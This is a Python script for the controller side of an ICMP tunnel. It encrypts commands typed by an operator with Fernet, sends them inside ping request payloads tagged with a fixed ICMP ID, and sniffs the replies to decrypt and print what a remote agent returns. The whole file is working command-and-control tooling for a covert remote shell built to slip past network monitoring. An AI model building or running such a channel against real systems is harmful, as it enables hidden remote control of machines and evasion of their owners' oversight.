from cryptography.fernet import Fernet
from scapy.all import sr, IP, ICMP, Raw, sniff
from threading import Thread
import base64

# Constants
ICMP_ID = 13170
TTL = 64
DEST_IP = '127.0.0.1'

# Load Fernet key
def load_key():
    with open('key', 'rb') as keyfile:
        return Fernet(keyfile.read())

# Encryption/Decryption
def encrypt_data(data, fernet):
    return base64.b64encode(fernet.encrypt(data.encode())).decode()

def decrypt_data(data, fernet):
    return fernet.decrypt(base64.b64decode(data)).decode()

# Packet handler
def packets(pkt, fernet):
    if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
        if pkt[IP].src == DEST_IP and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID:
            raw_data = pkt[Raw].load.decode('utf-8', errors='ignore').replace('\n', '')
            try:
                decrypted = decrypt_data(raw_data, fernet)
                print(decrypted)
            except Exception as e:
                print(f"[!] Decryption failed: {e}")

# Sniffer function
def sniffer(interface, fernet):
    sniff(iface=interface, prn=lambda pkt: packets(pkt, fernet), filter='icmp', store=0)

# Main function
def main():

    with open('key', 'wb') as keyfile:
        keyfile.write(Fernet.generate_key())

    interface = input("Enter interface: ")
    fernet = load_key()

    sniffing_thread = Thread(target=sniffer, args=(interface, fernet), daemon=True)
    sniffing_thread.start()
    print("[+] ICMP Traffic Listener started.")

    while True:
        command = input("cmd: ").strip()
        if command.lower() == 'exit':
            print("[+] Stopping ICMP Listener")
            break
        elif not command:
            continue
        else:
            encrypted_cmd = encrypt_data(command, fernet)
            pkt = IP(dst=DEST_IP, ttl=TTL) / ICMP(type=8, id=ICMP_ID) / Raw(load=encrypted_cmd)
            sr(pkt, timeout=0, verbose=0)

if __name__ == "__main__":
    main()
